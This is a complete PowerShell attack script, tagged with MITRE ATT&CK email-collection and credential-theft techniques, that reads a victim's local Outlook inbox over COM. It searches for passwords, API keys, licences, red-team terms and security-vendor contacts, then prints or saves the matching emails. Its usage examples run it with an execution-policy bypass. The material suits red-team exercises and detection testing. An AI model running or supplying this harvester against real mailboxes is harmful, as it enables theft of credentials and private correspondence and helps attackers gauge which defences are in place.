<#
  T1114.001 - Email Collection: Local Email Collection
  T1555 - Credentials from Password Stores
  Script to search in outlook mailbox for specific keywords or default keywords like passwords, license, api key, tokens stored in email for example.
#>
param(
    [Parameter(Mandatory=$false)]
    [switch]$all,

    [Parameter(Mandatory=$false)]
    [switch]$s,
    
    [Parameter(Mandatory=$false)]
    [switch]$b,

    [Parameter(Mandatory=$false)]
    [switch]$c,

    [Parameter(Mandatory=$false)]
    [string]$o,
    
    [Parameter(Mandatory=$false)]
    [string[]]$k,

    [Parameter(Mandatory=$false)]
    [switch]$help

)


function ShowHelp{
    Write-Host "This script will search keywords in your mailbox
You must choose between one of the 4 parameters below:
    [-all] search keywords in the body message, subject and sender/recipients contact names of each email
    [-b] search keywords in the Body message of each email
    [-s] search keywords in the subject of each email
    [-c] search keywords in the contacts name of each email
Optionnaly you can use the -o or -k:
    [-o] specify a path to save the results (if -o is not used, the script will print the results in the console)
    [-k] specifiy a list of keywords to search, if -k is not used, the script will use default keywords declared in the script.
`nExample usages:
Search default keywords list from script in all the fields (subject, body and sender/recipients) of each emails
    powershell -ep Bypass -File search_outlook_mail.ps1 -all -o C:\Users\mthcht\
Search password, API key and license keywords in all the fields (subject, body and sender/recipients) of each emails and save the results in C:\Users\mthcht
    powershell -ep Bypass -File search_outlook_mail.ps1 -all -k password,`'API key`',license -o C:\Users\mthcht\
Search the text `"click on this link`" in Body message of each emails and save the results in C:\Users\mthcht
    powershell -ep Bypass -File search_outlook_mail.ps1 -b -k `"click on this link:`" -o C:\Users\mthcht\
Search default keywords list from script in contacts fields (sender/recipients) of each emails
    powershell -ep Bypass -File search_outlook_mail.ps1 -c
Search default keywords list from script in Body message of each emails
    powershell -ep Bypass -File search_outlook_mail.ps1 -b
Search default keywords list from script in the subject of each emails
    powershell -ep Bypass -File search_outlook_mail.ps1 -s
Search default keywords list from script in all the fields (subject, body and sender/recipients) of each emails
    powershell -ep Bypass -File search_outlook_mail.ps1 -all
Search the keyword 'RE: Pentest' and redteam in subject of each emails and save the results in C:\Users\mthcht\
    powershell -ep Bypass -File search_outlook_mail.ps1 -s -k `'RE: Pentest`',redteam -o C:\Users\mthcht\"
    exit 1
}

if($help){ShowHelp}
if(!($all -or $b -or $s -or $c)) {
    Write-Host -ForegroundColor Red "Error: you must choose between one of the 4 parameters [-all, -b, -s, -c]"
    ShowHelp
}
if($all -and ($b -or $s -or $c)) {
    Write-Host -ForegroundColor Red "Error: you cannot choose [-all] with other parameters [-b, -s, -c]"
    ShowHelp
}
if($b -and ($all -or $s -or $c)) {
    Write-Host -ForegroundColor Red "Error: you cannot choose [-b] with other parameters [-all, -s, -c]"
    ShowHelp
}
if($s -and ($b -or $all -or $c)) {
    Write-Host -ForegroundColor Red "Error: you cannot choose [-s] with other parameters [-b, -all, -c]"
    ShowHelp
}
if($c -and ($b -or $s -or $all)) {
    Write-Host -ForegroundColor Red "Error: you cannot choose [-c] with other parameters [-b, -s, -all"
    ShowHelp
}
if(!$k){
    # Define default keyword lists
    $keyword_list_subject = @("password", "redteam","security alerts")
    $keyword_list_body = @("root-me","pentest","your password")
    $keyword_list_contacts = @("sentinelone","crowdstrike")
    $keyword_list_all = @("password","api key","license")
}
else{
    $k = $k.split(',')
    if($b){$keyword_list_body = $k}
    if($c){$keyword_list_contacts = $k}
    if($s){$keyword_list_subject = $k}
    if($all){$keyword_list_all = $k}
}


#get all emails from mailbox
function Get-OutlookInbox {
    Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
    $outlook = New-Object -ComObject Outlook.Application 
    $namespace = $outlook.GetNameSpace("MAPI")
    $inbox = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox)
    $inbox.Items
}

try{
    $all_email = Get-OutlookInbox | Sort-Object -Property Received 
    if($all){
        #search for keywords in all possible fields
        $results_all = @{}
        foreach($email in $all_email){
            foreach($keyword in $keyword_list_all){
                if(($email.Subject -match "$keyword") -or ($email.Body -match "$keyword") -or ($email.To -match "$keyword") -or ($email.SentOnBehalfOfName -match "$keyword") -or ($email.SenderEmailAddress -match "$keyword")) {
                    if ($results_all.ContainsKey("$keyword")) {
                        # create new array if key already exist
                        $arr = ,$email
                        # Add existing emails to array
                        $arr += $results_all["$keyword"]
                        # Set new array as value for key
                        $results_all["$keyword"] = $arr
                    }
                    else {
                        $results_all["$keyword"] = $email
                    }
                }
            }
        }
        $result = $results_all
        if($o){
            Foreach ($key in $result.Keys) {
                $($result[$key]) | Out-File -FilePath "$o\\result_outlook_search_all_$key.txt"
                Write-Host -ForegroundColor Green "[sucess] keyword $key saved in $o\\result_outlook_search_all_$key.txt"
            }
        }
        else{
            Foreach ($key in $result.Keys) {
                Foreach ($email in $($result[$key])){
                    Write-Host "-----------------------------`n`n`nSender:" 
                    $email.SentOnBehalfOfName
                    $email.SenderEmailAddress
                    Write-Host "`nRecipient: "
                    $email.To
                    Write-Host "`nSubject: "
                    $email.Subject
                    Write-Host "`nBody: "
                    $email.Body
                }
            }           
        }
    }
    if($s){
        #search for keywords in subject
        $results_subject = @{}
        foreach($email in $all_email){
            foreach($keyword in $keyword_list_subject){
                if($email.Subject -match "$keyword"){
                    if ($results_subject.ContainsKey("$keyword")) {
                        # create new array if key already exist
                        $arr = ,$email
                        # Add existing emails to array
                        $arr += $results_subject["$keyword"]
                        # Set new array as value for key
                        $results_subject["$keyword"] = $arr
                    }
                    else {
                        $results_subject["$keyword"] = $email
                    }
                }
            }
        }
        $result = $results_subject
        # Output result
        if($o){
            Foreach ($key in $result.Keys) {
                $($result[$key]) | Out-File -FilePath "$o\\result_outlook_search_subjects_$key.txt"
                Write-Host -ForegroundColor Green "[sucess] keyword $key saved in $o\\result_outlook_search_subjects_$key.txt"
            }
        }
        else{
            Foreach ($key in $result.Keys) {
                Foreach ($email in $($result[$key])){
                    Write-Host "-----------------------------`n`n`nSender:" 
                    $email.SentOnBehalfOfName
                    $email.SenderEmailAddress
                    Write-Host "`nRecipient: "
                    $email.To
                    Write-Host "`nSubject: "
                    $email.Subject
                    Write-Host "`nBody: "
                    $email.Body
                }
            }
        }
    }
    if($b){
        $results_body = @{}

        foreach($email in $all_email){
            foreach($keyword in $keyword_list_body){
                if($email.Body -match "$keyword"){
                    if ($results_body.ContainsKey("$keyword")) {
                        # create new array if key already exist
                        $arr = ,$email
                        # Add existing emails to array
                        $arr += $results_body["$keyword"]
                        # Set new array as value for key
                        $results_body["$keyword"] = $arr
                    }
                    else {
                        $results_body["$keyword"] = $email
                    }
                }
            }
        }
        $result = $results_body 
        if($o){
            Foreach ($key in $result.Keys) {
                $($result[$key]) | Out-File -FilePath "$o\\result_outlook_search_body_$key.txt"
                Write-Host -ForegroundColor Green "[sucess] keyword $key saved in $o\\result_outlook_search_body_$key.txt"
            }
        }
        else{
            Foreach ($key in $result.Keys) {
                Foreach ($email in $($result[$key])){
                    Write-Host "-----------------------------`n`n`nSender:" 
                    $email.SentOnBehalfOfName
                    $email.SenderEmailAddress
                    Write-Host "`nRecipient: "
                    $email.To
                    Write-Host "`nSubject: "
                    $email.Subject
                    Write-Host "`nBody: "
                    $email.Body
                }
            }
        }
    }
    if($c){
        #search for keywords in contacts
        $results_contacts = @{}
        foreach($email in $all_email){
            foreach($keyword in $keyword_list_contacts){
                if(($email.To -match "$keyword") -or ($email.SentOnBehalfOfName -match "$keyword") -or ($email.SenderEmailAddress -match "$keyword")) {
                    if ($results_contacts.ContainsKey("$keyword")) {
                        # create new array if key already exist
                        $arr = ,$email
                        # Add existing emails to array
                        $arr += $results_contacts["$keyword"]
                        # Set new array as value for key
                        $results_contacts["$keyword"] = $arr
                    }
                    else {
                        $results_contacts["$keyword"] = $email
                    }
                }
            }
        }
        $result = $results_contacts
        # Output result
        if($o){
            Foreach ($key in $result.Keys) {
                $($result[$key]) | Out-File -FilePath "$o\\result_outlook_search_contacts_$key.txt"
                Write-Host -ForegroundColor Green "[sucess] keyword $key saved in $o\\result_outlook_search_contacts_$key.txt"
            }
        }
        else{
            Foreach ($key in $result.Keys) {
                Foreach ($email in $($result[$key])){
                    Write-Host "-----------------------------`n`n`nSender:" 
                    $email.SentOnBehalfOfName
                    $email.SenderEmailAddress
                    Write-Host "`nRecipient: "
                    $email.To
                    Write-Host "`nSubject: "
                    $email.Subject
                    Write-Host "`nBody: "
                    $email.Body
                }
            }
        }
    }
}
catch{
    Write-host -ForegroundColor Red "[failed] Error: $_ "
}

